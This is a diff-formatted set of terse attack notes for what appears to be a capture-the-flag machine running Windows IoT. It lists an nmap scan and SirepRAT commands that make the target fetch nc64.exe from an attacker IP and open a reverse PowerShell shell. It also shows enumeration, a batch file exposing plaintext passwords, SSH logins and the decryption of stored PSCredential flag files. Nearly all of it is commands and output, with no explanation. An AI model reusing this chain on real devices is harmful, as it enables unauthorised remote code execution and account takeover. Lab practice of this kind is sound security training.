@@ -1,0 +1,185 @@
+nmap -T4 -Pn -A 10.10.10.204
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-14 09:50 IST
+Nmap scan report for 10.10.10.204
+Host is up (0.28s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE VERSION
+135/tcp  open  msrpc   Microsoft Windows RPC
+8080/tcp open  upnp    Microsoft IIS httpd
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Windows Device Portal
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn't have a title.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.59 seconds
+
+
+
+
+
+https://github.com/SafeBreach-Labs/SirepRAT
+
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/C Powershell Invoke-WebRequest http://10.10.14.9:15000/nc64.exe -OutFile C:\Windows\Temp\nc64.exe" --vv
+
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/C C:\Windows\Temp\nc64.exe 10.10.14.9 1234 -e powershell.exe" --vv
+
+
+
+
+PS C:\program files\windowspowershell\modules\packagemanagement> $Env:path
+$Env:path
+C:\windows\system32;C:\windows;C:\windows\System32\OpenSSH\;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\
+
+C:\>echo %username%
+echo %username%
+omni$
+
+C:\>net user
+net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            app                      DefaultAccount           
+DevToolsUser             Guest                    sshd                     
+WDAGUtilityAccount       
+The command completed with one or more errors.
+
+
+
+PS C:\data\programdata\ssh
+
+
+
+
+
+PS C:\Data\Users\app> cat user.txt
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">flag</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d
+7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b430304
+7cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008
+a36c133c36f4da2f9406ae7</SS>
+    </Props>
+  </Obj>
+</Objs>
+
+
+
+
+
+
+
+
+PS C:\program files\windowspowershell\modules\packagemanagement> cat r.bat
+cat r.bat
+@echo off
+
+:LOOP
+
+for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete
+
+net user app mesh5143
+net user administrator _1nt3rn37ofTh1nGz
+
+ping -n 3 127.0.0.1
+
+cls
+
+GOTO :LOOP
+
+:EXIT
+
+
+
+https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx
+
+
+
+ssh app@10.10.10.204
+app@10.10.10.204's password: 
+
+Microsoft Windows [Version 10.0.17763.107]
+Copyright (c) Microsoft Corporation. All rights reserved.
+ 
+app@omni C:\Data\Users\app>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Data\Users\app>ls
+
+
+    Directory: C:\Data\Users\app
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         7/4/2020   7:28 PM                3D Objects
+d-r---         7/4/2020   7:28 PM                Documents
+d-r---         7/4/2020   7:28 PM                Downloads
+d-----         7/4/2020   7:28 PM                Favorites
+d-r---         7/4/2020   7:28 PM                Music
+d-r---         7/4/2020   7:28 PM                Pictures
+d-r---         7/4/2020   7:28 PM                Videos
+-ar---         7/4/2020   8:20 PM            344 hardening.txt
+-ar---         7/4/2020   8:14 PM           1858 iot-admin.xml
+-ar---         7/4/2020   9:53 PM           1958 user.txt
+
+
+
+PS C:\Data\Users\app> $credential = Import-CliXml -Path  ./user.txt
+PS C:\Data\Users\app> $credential.GetNetworkCredential().Password
+7cfd50f6bc34db3204898f1505ad9d70
+
+
+
+
+
+
+ssh administrator@10.10.10.204
+administrator@10.10.10.204's password: 
+
+Microsoft Windows [Version 10.0.17763.107]
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+administrator@omni C:\Data\Users\administrator>powershel
+'powershel' is not recognized as an internal or external command,
+operable program or batch file.
+
+administrator@omni C:\Data\Users\administrator>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved. 
+
+PS C:\Data\Users\administrator> ls 
+ 
+
+    Directory: C:\Data\Users\administrator
+ 
+ 
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         7/3/2020  11:23 PM                3D Objects
+d-r---         7/3/2020  11:23 PM                Documents
+d-r---         7/3/2020  11:23 PM                Downloads
+d-----         7/3/2020  11:23 PM                Favorites
+d-r---         7/3/2020  11:23 PM                Music
+d-r---         7/3/2020  11:23 PM                Pictures
+d-r---         7/3/2020  11:23 PM                Videos
+-ar---         7/4/2020   9:48 PM           1958 root.txt
+
+
+
+PS C:\Data\Users\administrator> $credential = Import-CliXml -Path  ./root.txt
+PS C:\Data\Users\administrator> $credential.GetNetworkCredential().Password
+5dbdce5569e2c4708617c0ce6e9bf11d
